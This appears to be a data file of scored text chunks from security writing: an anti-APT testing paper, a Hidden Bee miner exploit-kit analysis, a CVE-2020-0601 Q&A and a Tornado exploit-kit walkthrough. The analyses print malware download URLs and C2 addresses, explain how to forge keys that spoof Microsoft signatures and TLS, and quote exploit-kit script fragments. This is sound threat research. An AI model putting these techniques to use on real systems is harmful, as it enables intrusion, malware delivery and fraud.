But what is the ‘real world’ when it comes to threats and protection against those threats? Is it possible to at least test some very important parts of anti-APT products? Or should testers give up and leave customers simply to trust vendor claims?
To continue with FireEye’s statement, Merkel mentioned ‘sophisticated criminal networks and nation states’ as being the perpetrators of APT attacks. This leads us to two important questions:
Is an APT attack the exclusive domain of ultra-sophisticated and extremely well-resourced actors?
Is the attack only an ‘APT’ if those actors always use the most technically advanced attack techniques? Does it lose its ‘APT’ label if the same actors use less sophisticated tools, tactics and techniques?
If the answer to both of the above questions is ‘yes’ then a government intelligence agency could target competitors using relatively unsophisticated techniques and, in doing so, would evade the ‘APT’ classification and, presumably, the anti-APT products on offer.
A ‘yes’ answer would also lead us to conclude that opponents of an organization that are neither part of a criminal organization nor a government-sponsored group could use extremely advanced tools and tactics to steal information but would be able to evade the ‘APT’ classification and, again presumably, the anti-APT products/services.
Of course, if APTs are the exclusive domain of spies and the Mafia then, regardless of how sophisticated they are, testers will never be able to launch an APT and the testing game is over. That is unless a tester becomes a spy or master criminal… Let’s have a sanity check:
A national intelligence agency sets up a watering hole attack using a commercial exploit toolkit in order to gain long-term access to political activists. It uses the toolkit to appear less sophisticated for disavowal purposes when the attack is inevitably uncovered in time.
An individual discovers a software vulnerability and develops a zero-day exploit, which s/he uses to gain and maintain access to a network. This access is used to create deeper levels of access to systems on the network, which is then used to steal data on a regular basis. The data may be of interest to that individual for a number of reasons, to sell or use directly.
Are neither of the above examples APTs? If not, why not? Customers of anti-APT products would most likely not care about subtle labelling. They would expect both of the above events to be detected and ultimately curtailed, if not prevented in the first place.",0.01700273536348118
"4.1.4 Responding to test results requires resources
When a vendor becomes aware of a report containing results related to its own product it frequently needs to spend time and other resources on analysing the report and associated data, and then possibly responding to any criticism it may believe to be unfair.
Testers may even request that the vendor provides the necessary equipment and expertise in setting up the product for testing. Vendors who ignore such requests risk the tester obtaining the incorrect product, setting it up incorrectly and misunderstanding how it is supposed to work.
In some cases, notably with vendors that provide managed services, it is necessary to involve staff to provision the service. This may even involve a partner company. The expense of provisioning, monitoring and reacting to the test can be significant.",0.018377335956521357
"4.1.5 Tests require defender reactions
This is a genuinely tricky element of any enterprise-level technology test. In a real working situation, anti-APT products do not mitigate all threats automatically. There most likely has to be human intervention from the defender, such as an administrator noticing and acting on alerts.
How this person or persons behave will vary depending on their resources, such as the level of their training, their technical skills, commitment, and the amount of time they have available to analyse and react to alerts.
Testers need to replicate the behaviour of one or more operators of an anti-APT solution. For useful results it may require multiple tests with different operator behaviours. This could turn into a behavioural test more akin to a social studies project than the technical test most would expect.",0.01892790646341369
"4.1.6 Tests require unknown malware/exploits
If the right type of malware and exploits for an anti-APT test have to be unknown then how is it possible for a tester to conduct such a test? Possible methods might include creating new threats or discovering threats that are live on the Internet that are not detected by any known anti-malware product.
Creating new malware requires a set of skills not usually found in anti-malware testing labs, although such tests have been known. For example, Simon P.G .Edwards has performed consumer computer magazine tests in the past that used heavily modified trojans, while MRG Effitas regularly conducts tests using ‘simulators’ (modified trojans) and even live botnets.
However, in all of these cases the threats are at least based on known malware and it is unlikely that there are many testers competent enough to create complete new and sufficiently sophisticated malware. It may not be necessary to do so, though.
Tests should be able to assess claims made about the anti-APT products, which are supposed to be able to handle advanced attacks and malware. How advanced these elements should be will depend on how advanced they are in real life. Recent reports suggest that APTs in the real world often compromise a chain of events and threats that are quite easily copied by testers.
For example, in September 2014 FireEye published a blog post detailing an APT campaign by the so-called APT12 ‘cyber espionage’ group [8]. The tools, tactics and techniques used should be familiar to most in the anti-malware testing industry and are not especially sophisticated in terms of unknown malware and exploits.
In fact, the campaign in question used an exploit toolkit to attack a two year-old vulnerability (CVE-2012-0158). The tactics used involved attaching an ‘infected’ Word document to a spear-phishing email. This is very similar to the more advanced attack described in Section 3.1.
It does not seem that this particular campaign was so advanced that something similar could not be run in a test.",0.017022206892225777
"4.1.7 Tests require malware/exploits capable of bypassing other solutions
This objection, which stems from FireEye’s main marketing message at the time of writing, is quite clever because it is sort of meaningless but also essentially excludes any malware that can be detected by any other anti-malware solution. This in turn raises the bar for testers to the point where they have to find completely new malware that has never been encountered by any known security vendor.
The criterion is also quite meaningless, though, because it’s not so much the case that malware can bypass protection mechanisms but more that protection mechanisms may fail to detect or protect against the malware. This sounds like semantics so let’s explore what this subtlety really means.
Malware is not usually capable of ‘bypassing’ an anti-virus product. A dropped file would not, before it executes, usually be capable of very much at all. Anti-virus products can, however, miss malware.
Let’s imagine a malware binary that is not known to any anti-malware vendor. This would fit the above criteria for inclusion in a test if it could be proven to be universally undetectable. (Let us, for the minute, forget how hard it would be to confirm for sure that no anti-malware product in the world could detect it without alerting anti-malware vendors as to the sample’s existence.)
In another example let’s consider a malicious program that is detectable by many popular anti-malware products but not by Microsoft System Center Endpoint Protection. Does this sample fit the testing criteria? After all, it can bypass at least one solution so maybe it is valid to use this as part of a test attack. This is where things become meaningless. Does the malware need to be undetectable by one, four or all other solutions before it becomes a valid candidate for a test? How unknown does it need to be, to be unknown?
In the second example, maybe it is unknown only to Microsoft today. Does it become ineligible for inclusion in the test when sample-sharing systems catch up and the data reaches Microsoft?
A vendor might complain that testers should not assess its product using regular malware because that’s not what it’s supposed to protect against. But it’s fair to test a car’s safety features by driving it into a wall because, although you’re not supposed to, people want to know what happens when such events happen. It doesn’t mean that the product is useless if it misses some regular malware that should be picked up by another solution, and it doesn’t mean that the car is useless if it crumples under the impact of the collision.",0.01935016800406908
"4.1.8 A thought on customer expectations
If customers expect a SourceFire, FireEye, Fortinet or Palo Alto product to protect the network all the time by blocking new threats they may be disappointed to learn that these products do not offer this as their main service, although this is not to say they cannot still effectively defend against an APT.
Most such products monitor the network and, after detecting a threat that initially evaded them, can correlate data to discover what happened in the past.
The term ‘block’ is used a lot in marketing material and implies initial blocking, whereas in fact it may refer to blocking the threat after it has existed on the network for some time. This is an important factor when formulating a suitable testing methodology.",0.01604457289506589
"4.1.9 Obstacles vs. practical and ambitious solutions
Table 1 includes a list of some of the obstacles that we (informally) hear for APT defence testing. We offer two options for overcoming these roadblocks. The first takes a practical approach that addresses the roadblock while the second is a more encompassing approach that illustrates the ‘high-end’ solution that is probably financially impractical but which would represent a ‘gold standard’ in APT testing.
Obstacle
Solution #1 (practical)
Solution #2 (ambitious)
All tests will not be real-world.
Use same tools, tactics and techniques as adversaries use in real-world APT campaigns.
Testers administer multiple defence systems on real target networks.
Attackers will eventually gain access if persistent so testing becomes a penetration test that necessarily requires the reaction of the target’s IT staff.
Assess capabilities of automated elements and assume/categorize levels of skill, commitment and resources of the target. There may be more than one set of results for each product/attack. Assess usability and thoroughness of alert and logging system.
Perform a ‘Capture the Flag’ contest with independent penetration testers as the attackers and vendor-supplied consultants as the defenders (who are under pressure to perform some duties unrelated to monitoring logs, perhaps).
Testers require a range of attack skills beyond sourcing and executing malware from various sources.
Train on a range of attack skills or create bespoke environments with known weaknesses.
Sub-contract attacks to professional penetration testers.
Table 1. APT defence testing obstacles.",0.017813596780871466
"5. The way forward
Based on our discussion it is clear that there is a continuum of possible attacks, all of which fit someone’s definition of what an APT is. Thus tests will, by necessity, reflect this spectrum where, as we put it, the attacker’s skills range ‘from zero to Neo’.
Be clear on the APT actually being tested.
Based on this discussion, our first requirement for any APT test is that the definition of APT is clearly stated and the threat model is described.
Beyond this, it is important that the tester explains what is being tested. Is the tester claiming that the test covers the entire lifecycle of the APT or does it handle just one or two steps? If the former then scoring becomes a huge issue. Prima facie, the earlier in the lifecycle that the threat is detected the better. For tests that attempt to cover the range of detection options offered by anti-APT suites examine carefully how the scores are applied at different layers.
Be clear on whether the threat is zero, Neo or other.
We still see attacks using two-year-old exploits and we have threats such as Stuxnet that are loaded up with zero-day attacks. When looking at a test of APT solutions make sure that the tester is clear on what level of protection is offered and from what attack. Is the test against custom malware or is it simply a Metasploit-generated year-old exploit?
While the idea of testing with zero-day attacks sounds impossible, in fact there is a way in which such a test can be done. Instead of finding zero-day vulnerabilities in existing code, insert new vulnerabilities into open-source software and then build exploits for these weaknesses. This approach has the advantages that it creates no new threat to the general public (the exploit only works for our custom applications) and it tests a product’s ability to mitigate unknown threats.
Be clear on whether this is a test of a layer or a suite.
One of the mistakes it is easy to make when evaluating APT protection is to reduce the protection range and to focus on just a single aspect of protection, such as exploit detection. While such tests are valid it is important that we do not reduce the problem to just one layer of protection. For example, consider hypothetical products A and B.
Product A has outstanding exploit detection, but little else. Product B has a wide range of protection techniques, none of which is perfect but, when combined, these layers provide an extremely solid prevention and detection platform. Given that APTs can come in many forms (and some do not even have to use exploits) B probably has better protection than A in general. However, for some types of customer Product B reflects the ‘best’ component in their home-built layered protection scheme.
The guidance here is simple: be sure you understand what rolled up scores represent and do not blindly accept rankings that may not measure what you want. Furthermore, tests that claim to be assessing APT protection must consider all layers or fail to be a valid test of what it claims (although it may be a valid test of specific functionality).
Any APT test must examine infiltration.
We argue that the earlier in the attack chain that the APT is caught the better. Thus, for a layered test, it is important that testers examine the most common infiltration mechanisms. This would include, at a minimum, email, web, exploit, offline (media), social engineering, file execution and downloader/droppers, which is quite a list.",0.019403372415130016
"6. Conclusions
APT testing is complicated enough without having to consider the fact that the term APT is ill-defined. Furthermore, in a real APT scenario the attacker will not blindly throw in the towel when an attack is blunted, but will probe until a weakness is found. This co-evolutionary aspect between attacker and defender is most obvious when considering targeted attacks, as the attackers have specific goals and desires and will adapt to defences as best as they are able. Stopping the first salvo in an APT attack is not the end of the road. Instead, the protective countermeasures must withstand multiple waves of attack.
We argue that the single most important step with respect to moving forward is for testers and test consumers to be clear about the purpose of the test and whether that test can measure the feature(s) in question. This one single question can help both in test creation and interpretation.
The authors note that the views expressed in this paper are their own personal opinions and do not necessarily reflect the views of either AMTSO or their current employers.",0.012426604284180187
"Bibliography
[1] Advanced Persistent Threat (APT). TechTarget. November 2010. http://searchsecurity.techtarget.com/definition/advanced-persistent-threat-APT.
[2] Advanced Persistent Threat. Wikipedia. http://en.wikipedia.org/wiki/Advanced_persistent_threat.
[3] The Targeted Persistent Attack (TPA). NSS Labs. 19 August 2012. https://www.nsslabs.com/blog/targeted-persistent-attack-tpa-when-thing-goes-bump-night-really-bogeyman.
[4] Defining the “Advanced Persistent Threat”. Gartner. 11 November 2010. http://blogs.gartner.com/john_pescatore/2010/11/11/defining-the-advanced-persistent-threat.
[5] Juels, A.; Yen, T.-F. Sherlock Holmes and the Case of the Advanced Persistent Threat. RSA, 2012. https://www.usenix.org/conference/leet12/workshop-program/presentation/juels.
[6] Advanced Persistent Threats: A Brief Description. Damballa. https://www.damballa.com/advanced-persistent-threats-a-brief-description.
[7] Phases of an APT attack. Mandiant. http://intelreport.mandiant.com.
[8] Darwin’s Favorite APT Group. FireEye. https://www.fireeye.com/blog/threat-research/2014/09/darwins-favorite-apt-group-2.html.
",0.016327000408128067
"‘Hidden Bee’ miner delivered via improved drive-by download toolkit
This blog post was authored by @hasherezade and Jérôme Segura.
We recently detected a drive-by download attack trying to exploit CVE-2018-4878, a vulnerability in Flash Player, in a sequence that was not matching any of the exploit kit patterns that we currently track. Upon investigation, we discovered something that was new to us, but is part of an existing exploitation framework referenced in late 2017 by Chinese security firm Qihoo360. At the time, the payload appeared to be a Trojan pushing adware. (Note: On July 26, our colleagues from TrendMicro published a blog post calling it the Underminer exploit kit).
Since it was last documented, there have been changes to the exploits being used, although the distribution method is similar. One interesting aspect that we don’t see much of these days is the use of encryption to package exploits on-the-fly, which requires a key from the backend server to decrypt and execute them.
The payload served in this campaign is also out of the ordinary because it is not a standard PE file. Instead, it is a multiple-stage custom executable format, acting also as a downloader to retrieve LUA scripts used by the threat actors behind the Hidden Bee miner botnet. This was perhaps the first case of a bootkit being used to enslave machines mining cryptocurrencies.
Campaign overview
The attackers are leveraging malvertising via adult sites to redirect their victims to the exploit kit landing page. We believe this campaign is primarily targeting Asian countries based on the ads that are served and our own telemetry data. A server purporting to be an online dating service contains a malicious iframe responsible for the exploitation and infection phases.",0.011347772096253261
Traffic play-by-play,0.009960719507415727
"IE exploit
With a few exceptions, exploit kits typically obfuscate their landing page and exploits. But here the threat actors go beyond by using encryption and requiring a key exchange with the backend server in order to decrypt and execute the exploit. In the past, Angler, Nuclear and Astrum exploit kits have abused the Diffie-Hellman key exchange protocol in similar ways to prevents analysts from replaying malicious traffic.
The execution of the malicious code starts from a webpage with an embedded encrypted block. This block is Base64 encoded and encrypted with one of two algorithms: RC4 or Rabbit.",0.011723389846491017
"After being decrypted, the block is executed. You can find the decoded version of the Java Script that is being run here. As you can see in the script, it generates a random session key, then encrypts it with the attacker’s public RSA key:",0.010390630380030075
The encrypted key is being passed onto the next function and converted into JSON format to perform a POST request to the hardcoded URL:,0.007685653444195584
This is what we can see if we look at the traffic between the client and the server (the client sends the encrypted “key” and the server responds with the “value”):,0.01002369932631575
Server-side,0.007833146482435271
"With the attackers’ private RSA key, the server decrypts the passed session key.
It uses it to encrypt the exploit content with a chosen symmetric algorithm (Rabbit or RC4).
It returns the encrypted content back to the client.",0.017309182553695845
"Thanks to the fact that the client still has an unencrypted version of the key in memory, it is able to decrypt and execute the exploit. However, researchers who just have the traffic captured cannot retrieve the original session key, and replaying the exploit is impossible. Thankfully, we managed to capture the exploit during dynamic analysis.
We believe that the decrypted exploit is CVE-2018-8174, as one of our test machines patched against CVE-2016-0189 got exploited successfully.
Flash exploit
This newer Flash exploit (CVE-2018-4878) was not part of the exploit toolkit at the time Qihoo documented it, and seems to be a more recent addition to boost its capabilities. The shellcode embedded in the exploit is a downloader for the next stage.
Upon successful exploitation, it will retrieve its payload at the following URL:
This file, given the extension .wasm, pretends to be a Web Assembler module. But in fact, it is something entirely different, appearing to be a custom executable format, or a modified, header-less PE file.
It starts from the names of the DLLs that are going to be needed during the execution:",0.010546815873035298
"As you can see, it loads Cabinet.dll that is used for unpacking cabinet files. In later sections, we saw the APIs and strings that are used for the communication over HTTP protocol. We also found references to “dllhost.exe” and “bin/i386/core.sdb”.",0.009692055007801237
"It is easy to guess that this module will be downloading something and running via dllhost.exe.
Another interesting string is a Base64-encoded content:",0.01109022422669581
"The decoded content points to more URLs:
http://103.35.72.223/git/wiki.asp?id=530475f52527a9ae1813d529653e9501
http://103.35.72.223/git/glfw.wasm
http://103.35.72.223/rt/lsv3i06rrmcu491c3tv82uf228.wasm",0.010008485243953369
"Looking at the traffic captured by Fiddler, we found that, indeed, those URLs are being queried:",0.01589860086874173
"The requests are coming from dllhost.exe, so that means the above executable was injected there.
The file glfw.wasm has nothing in common with Web Assembly. It is, in fact, a Cabinet file, containing packed content under the internal path: bin/i386/core.sdb. Looking inside, we found the same custom executable format, starting from DLL names:",0.009960175435293817
"Then, HTTP traffic stops. This was another interesting aspect of this threa,t because the threat actors are perhaps trying to hide the traffic by pretending to use the SLTP protocol to retrieve the actual payload, which can be seen in the strings extracted from the Cabinet file inside of core.sdb:
INSTALL_SOURCE
&sid=%u
INSTALL_SID
INSTALL_CID
sltp://setup.gohub[.]online:1108/setup.bin?id=128
ntdll.dll
ZwQueryInformationProcess
VolumeNumber
SCSIDISK
os=%d&ar=%d
kernel32.dll
IsWow64Process
RtlGetNtVersionNumbers
%02x
&sz=
sltp
That hostname resolves to 67.198.208[.]110:
Pinging setup.gohub.online [67.198.208.110] with 32 bytes of data:
Reply from 67.198.208.110: bytes=32 time=76ms TTL=51
Encrypted TCP network traffic from our sandboxed machine shows how the binary payload is retrieved:",0.012182321179011413
"This whole exploitation and payload retrieval process is rather complex, especially in light of the intended purpose behind this drive-by campaign. Infected hosts are instructed to mine for cryptocurrencies:",0.01445140282459978
"What is unique about this miner is that it achieves persistence by using a bootkit, as described here. Infected hosts will have their Master Boot Record altered to start the miner every time the operating system boots.
A sophisticated attack for a simple payload
This attack is interesting on many levels for its use of different technologies both in the exploit delivery part as well as how the payload is packaged. According to our telemetry, we believe it is also focused on a select few Asian countries, which makes sense when taking its payload into consideration.
It also shows that threat actors haven’t completely given up on exploit kits, despite a noted downward trend over the last couple of years.
Protection
Malwarebytes detects both the IE and Flash exploits, resulting in the infection chain being stopped early on.",0.014334777338652516
"Indicators of compromise
Injected dating site
144.202.87[.]106
Exploit toolkit
103.35.72[.]223
52he3kf2g2rr6l5s1as2u0198k.wasm
087FD1F1932CDC1949B6BBBD56C7689636DD47043C2F0B6002C9AFB979D0C1DD
glfw.wasm
CCD77AC6FE0C49B4F71552274764CCDDCBA9994DF33CC1240174BCAB11B52313
Payload URL and IP
setup.gohub[.]online:1108/setup.bin?id=128
67.198.208[.]110
Miner Proxy
133.130.101[.]254
",0.009759819839806672
CVE-2020-0601 Q&A,0.00936274314604646
The SophosLabs Offensive Security team answers your questions about the CVE-2020-0601 (aka Chain of Fools and Curveball) vulnerability.,0.015669990294471803
"Written by
Andrew Brandt,",0.009161029206781302
"SophosLabs Offensive Security,",0.008335292689284901
Chester Wisniewski,0.009790463323101961
"January 22, 2020",0.010236511030314532
SophosLabs Uncut Threat Research Chain of Fools Curveball SophosLabs,0.010468431020548064
"This past Tuesday, Microsoft released its normal, monthly updates to Windows and other Microsoft products. Among the fixes included in this month’s release was one that resolves a security vulnerability in Windows, known variously as CVE-2020-0601, Chain of Fools and Curveball.
To address the many questions we’ve received over the past week, we’ve done a question and answer session with members of the SophosLabs Offensive Security team.
What operating systems are affected?
Windows 10, Windows Server 2016 and Windows Server 2019 are affected by this bug. The vulnerability exists in a component of Windows called crypt32.dll. That component also exists in earlier versions of Windows but the bug was introduced relatively recently and they aren’t affected.
What does crypt32 do?
Windows uses crypt32 to perform cryptographic tasks, such as such as validating the certificates that software companies use to digitally sign their applications, a process called Authenticode. It’s also used to check the signatures of TLS certificates, ensuring they’ve been signed by a legitimate certificate authority (CA).
Why does cryptographic signing matter?
Cryptographic certificates are used to decide what to trust and what not to. Certificates are used to vouch for the authenticity of websites, and to assure users that the software they’re using was created by a legitimate software vendor and hasn’t been tampered with.
Certificates rely on a “trust chain” that starts with a root certificate authority (root CA) trusted by the operating system. Certificates that identify a root CA can be used to sign other certificates, which can be used to sign other certificates, and so on. All the certificates in a chain trace their trustworthiness back to the root CA.
How can this vulnerability be abused?
This vulnerability breaks the trust chain by allowing an attacker to fool crypt32 into believing a certificate has been signed by a trusted root certificate authority when it hasn’t.
There are two ways this can be abused:
The first is by signing malware so that an affected operating system trusts it, believing it to have been signed by a trusted software vendor. An affected Windows computer would show that the malware’s certificate trust chain is unbroken all the way back to the root CA. Some software security tools rely on valid digital signatures to do application whitelisting and may allow malware signed in this way to run unimpeded.
The second way this bug can be abused is to create TLS certificates for Man-in-the-Middle (MiTM) attacks. In this case an attacker proxies the internet connection between a victim’s computer and the internet, using a forged certificate to decrypt traffic that relies on TLS, such as HTTPS. This could reveal passwords and other private information.
This kind of certificate forgery can also be used to create website certificates that appear to have been issued by a legitimate CA. This could fool users into thinking that a phishing site is the legitimate website of the company the criminal is trying to impersonate.
You can see how the vulnerability can be used to fool crypt32 in the video below.",0.014245172394658612
"How does the vulnerability work?
There are three integral components that define an elliptic curve (EC) cryptographic key: a curve, a public key, and a private key:",0.019022637401967857
"The curve component represents a mathematical elliptic curve formula.
The public key component is a pair of numbers (x,y) that represent a coordinate on the elliptic curve defined above.
The private key component is a large number, used for calculations, that is to be kept private by the key holder.",0.015497068484741972
"While the EC key remains private, a certificate will be provided by the signer for other parties to be able to verify a signature’s authenticity. In elliptic curve cryptography, a certificate contains the curve and public key components of the EC key it represents.
When the Windows system wants to check whether a given executable file has been signed by a Microsoft-owned cryptographic key, it extracts the certificate embedded in the file’s header and passes it to the crypt32.dll library function CertVerifyCertificateChainPolicy, invoked with the CERT_CHAIN_POLICY_MICROSOFT_ROOT parameter.
The function tries to find whether the given certificate is a Microsoft one: it takes the public key component from the examined certificate, and compares it against the public key component of each of Microsoft’s root certificates. If any of them contain an exact match, crypt32 deems them the same certificate, and therefore returns “Success” – the examined certificate is a Microsoft one.
The vulnerability here is a logic bug: the function fails to take the curve component into consideration when comparing certificates. Therefore, an EC key with an identical public key, but differing curve, to that of a Microsoft root certificate, will be accepted as a Microsoft root certificate by the function.
Does this matter? Yes. The curve component is crucial for EC’s cryptographic calculations, and changing it will effectively produce an entirely different EC key. The curve component only exists in EC keys, as opposed to other encryption keys like RSA, therefore only EC keys are affected by this bug.
To exploit this vulnerability, the idea is to craft a cryptographically valid and usable EC key whose public key component is copied from a Microsoft root certificate. This isn’t straightforward because the public key is derived from the private key and the curve, namely the result of a point multiplication operation between the two.
We can pick any value for our key’s private key component, so things get much easier (and more insecure) when we set the private key to simply be 1. Under that condition, the point multiplication operation between the private key and the curve will simply return the curve. Meaning, setting our curve to be the same value as a Microsoft root certificate’s public key component will result in our desired spoofed key.
But how flexible is the curve component? Looking at some crypto key generation libraries, one might get the idea that the curve can only be one of a pre-defined set: P-224, P-256, P-384, etc. However, thanks to Microsoft implementing support for the little-used ECParameters extension from RFC-3279 in Windows 10, it is possible to make use of a “Custom/Specified Curve” with arbitrarily chosen values in our EC key.
Finally, by crafting an EC key with the private key value of 1, and setting both the curve and public key values to match the public key from one of Microsoft’s root certificates, we will be able to sign executable files that will have crypt32 fool Windows into thinking they came from Microsoft.
Another crypt32 library function, CertGetCertificateChain, suffers from the same bug. This time, the supplied certificate is not tested against Microsoft’s root certificates, but in a more generic way against a given certificate chain. This is what renders some browsers (and other applications that rely on crypt32 to validate TLS certificates) vulnerable: they rely on this function to validate if a given website’s TLS certificate is ultimately trusted by one of the system’s (or the browser’s) root certificates.
In similar fashion, crafting a valid EC key with the same public key as any of the EC certificates in the relevant trusted certificate chain, and using it to sign a fake website’s TLS certificate, will fool crypt32 and therefore the browser into believing it to be the authentic website at that domain.
What software could be affected by it?
Any Windows applications – such as web browsers, file transfer tools or email clients – that rely on crypt32 for checking cryptographic certificates may be vulnerable to this bug.
What software is not affected?
The bug affects Microsoft’s implementation of certificate validation in the crypt32 library. It is not a bug in the X.509 specification used by the library. So, for example, full-disk encryption by the Windows Bitlocker feature is not affected.
Software that does not use crypt32 is unaffected. On Windows, it’s relatively uncommon for applications to use their own cryptographic libraries but there are a few. Notably, the Mozilla Foundation’s Firefox browser and Thunderbird email clients do not use crypt32.
Is there a way to detect or mitigate this vulnerability?
For now, the most effective way to mitigate the vulnerability is to patch your Windows 10, Windows Server 2016 and Windows Server 2019 systems as soon as possible. Earlier versions of Windows, such as Windows 7, Windows 8 and Windows 8.1 remain unaffected. Prior to Patch Tuesday, the bug was kept under wraps, but no longer: several people have already released proof-of-concept exploits for this bug and some people are already attempting to exploit it in the wild.
In addition to fixing the bug, this month’s Windows Update Rollup also includes some changes to the Windows Event Logs that will reveal when an application is attempting to exploit the vulnerability and spoof a legitimate digital signature.
Users of SIEM products can search their Windows Event Logs for Event ID 1, source: Audit-CVE. If an application with a signature forged by someone trying to exploit CVE-2020-0601 is run, an alert will appear in the logs that reads, in part, “This Event is generated when an attempt to exploit a known vulnerability ([CVE-2020-0601] cert validation) is detected.”
Can Sophos detect attempts to exploit the vulnerability?
Sophos has released the following protection:",0.0205085750040489
"CVE
SAV
IPS",0.009183097362180814
"CVE-2020-0601
Exp/20200601-D
2301366",0.01139174912865204
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
"Share on LinkedIn
",0.009855679767380665
"Exploit identification
2010-11-01",0.009390490440254418
"Mark Davis
Editor:
Helen",0.009310743685337908
"Martin
Abstract
In previous articles Mark Davis introduced exploit frameworks such as Fragus, Tornado, and others, and described how to analyse them using LAMP/WAMP servers. Here, he walks through a Tornado kit, start to finish, showing the process required to identify exploits in the kit.
Copyright © 2010 Virus Bulletin",0.010732218302261676
"My previous articles (see VB, April 2010, p.21, May 2010, p.17 and August 2010, p.8) have introduced exploit frameworks like Fragus, Tornado, and many others, and described how to analyse them using LAMP/WAMP servers. This article walks through a Tornado kit, start to finish, showing the process required to identify exploits in the kit. Principles from this example are applicable to the research of all such exploit frameworks. It begins with script or netflow analysis, decoding, more analysis, and continued correlation and testing, until reasonable confidence for exploit identification is acquired.",0.012444818138471092
"Approaching the kit
The first step is awareness of the kit. An analyst may perform multiple queries and coordinate in both public and private arenas to get an idea of what is already known about a kit. This can greatly expedite research angles and context for a researcher when analysing a kit. For example, an analyst may get an idea of how long a kit has been in the wild, the exploit vectors expected and/or deep kit analysis performed by others, and more.
For this demonstration a copy of the Tornado exploit kit was captured in the wild. A few directories exist along with a few files at the root level of the kit:
Data/
Exploits/
Include/
Stats/
.htaccess
Count.php
Dump.sql
Getexe.exe
Familiarity with the context of exploit kits (see previous articles) helps the analyst to assume the following about each element of the kit:
Data/ Contains possible log files for the kit itself, stolen data, or support media for the kit.
Exploits/ Probably contains exploits, but if this is a demo version, only a few common vectors will be present (demos usually exclude the important exploits).
Include/ Contains elements required for the kit set-up, normally including MySQL configuration, GeoIP, crypting, and similar configuration files.
Stats/ Contains statistics related to the kit, used to display in the kit (e.g. number of infections per country).
.htaccess This is probably an Apache distributed configuration file used to control access to the kit when on a web server.
Count.php This is probably a PHP file that is used to track something.
Dump.sql This is probably a sample SQL database file used in a demonstration of the kit or possibly containing full abuse data.
Getexe.exe This is probably the payload for the kit and what will be seen in URLs when exploitation is successful.
To identify the exploits the analyst immediately navigates to the exploits directory and finds files named ‘x1.php’ through ‘x16b.php’. This is a sequential naming convention that suggests that exploits are carefully managed by a unique number and/or letter variant. An analyst that is paying attention to this pattern will realize that online abuse data may point to other exploits, like 17.php or others not found in the demonstration kit. If this is the case, the analyst can work with the demonstration exploits and then correlate abuse data to suspected vectors of exploitation for 17.php and above to obtain a very solid concept of what the kit is confirmed to exploit and its likely exploits. This also gives the analyst the ability to configure behavioural environments to perform live tests against new Tornado exploit kits to confirm suspected exploit vectors for 17.php+ and higher.
Inspection of the content of the exploit files should first take place inside Notepad ++ or other similar safe viewing utility. All files contain the same ‘Zend’ header data and obfuscated content as shown in the snippet below from x1.php:
Zend
2006022801 2 0 3 1477 3349 xùŸ2­Wmo£FŽTU:9RÂ‰ò¡Á²—îæ¥>Nâõúár9Ån¯jÓÖw¬sq£|éÏí¯è,`»é%ªjÙvž™ }
At this point the analyst realizes that deobfuscation of the data is required before analysis, but may not understand the ‘Zend’ header. It is clear that all files are ‘Zended’, so a Google query may help to clarify this. Google queries such as ‘zend header’, ‘zend php files’ or ‘zend obfuscation’ may reveal content to help the analyst understand what he is dealing with and how to deobfuscate it. In this example, the analyst probably finds zend.com rather rapidly and learns of a commercial solution for working with PHP management and code. Next, a more descriptive Google query like ‘zend php file obfuscation’ is appropriate, leading to pages that discuss obfuscated PHP code and how to decode such files. Within a few minutes the analyst is able to understand the origin of Zend header files and that there are a variety of tools that can be used to deobfuscate such ‘zended’ scripts.
Several utilities exist online to de-zend scripts, such as http://old.boem.me/dezend/. However, analysts should never blindly trust any such utility, and should only use them inside a safe lab or virtualized environment rather than on a production machine. Some tools require terminal line interaction while others are GUIs, but eventually a tool can be found that successfully decodes the obfuscated PHP files. In this case, de-zending tools and success may vary based on the version of PHP being worked with, such as PHP4 or PHP5. Trial and error may be required to eventually find a successful vector for deobfuscating the code.
Now, a copy of the files exists on the analyst’s machine, de-zended and in the clear. x1.php now has introductory content as shown in the snippet below:
<?php
/*********************/
/*          */
/* Dezend for PHP5 */
/*     NWS    */
/*   Nulled.WS  */
/*          */
/*********************/",0.019959538270623134
"if ( defined( “GRANTED” ) )
{
exit( );
}
echo “var exeurl=url+’1’;\nfunction CreateO(o,n)
The first part of this script contains a header injected by the de-zending tool. The important part is the ‘if’ statement and below, which clearly shows hostile JavaScript. At this point the analyst may quickly scan the document for important clues such as CLSID values, eval statements, strings that may be unique to an exploit, or strings used by the actor that may reveal the identity of the exploit. When performing this kind of visual review of a script, analysts should use Notepad ++ or a programming package so that line numbers and colour-coding of the elements can be viewed. This greatly aids in reviewing data when compared to Notepad viewing. An example of this is shown in Figure 1.
Figure 1. Colour coding in Notepad ++ helps the analyst.
In reviewing x1.php de-zended scripts, we can see that multiple strings exist in the document, providing clues to possible exploit functionality:
ADODB.Stream
BD96C556-65A3-11D0-983A-00C04FC29E36
BD96C556-65A3-11D0-983A-00C04FC29E30
AB9BCEDD-EC7E-47E1-9322-D4A210617116
0006F033-0000-0000-C000-000000000046
0006F03A-0000-0000-C000-000000000046
6e32070a-766d-4ee6-879c-dc1fa91d2fc3
6414512B-B978-451D-A0D8-FCFDF33E833C
7F5B7F63-F06F-4331-8A26-339E03C0AE3D
06723E09-F4C2-43c8-8358-09FCD1DB0766
639F725F-1B2D-4831-A9FD-874847682010
BA018599-1DB3-44f9-83B4-461454C84BF8
D0C07D56-7C69-43F1-B4A0-25F5A11FAB19
E8CCCDDF-CA28-496b-B050-6C07C962476B
BD96C556-65A3-11D0-983A-00C04FC29E36
An Internet search for possible exploits and/or exploit examples related to the above strings and CLSID values can now be undertaken by the analyst. Unique to this first example is the large number of CLSID values and the string ‘ADODB.Stream’, which is not common among exploit files (most contain just one to three such strings). By combining terms and looking for exploits, the analyst can run the following query on Google: ‘adodb.stream BD96C556-65A3-11D0-983A-00C04FC29E36 exploit’. The first result from this query refers to an MDAC MS06-014 exploit:
Internet Explorer (MDAC) Remote Code Execution Exploit (MS06-014 ...",0.012948967397910405
"DataSpace’, ‘{BD96C556-65A3-11D0-983A-00C04FC29E36}’], .... var s =
CreateO(a, “WScript.Shell”); var o = CreateO(a, “ADODB.Stream”); var e = s. ...
securityreason.com/exploitalert/975 -
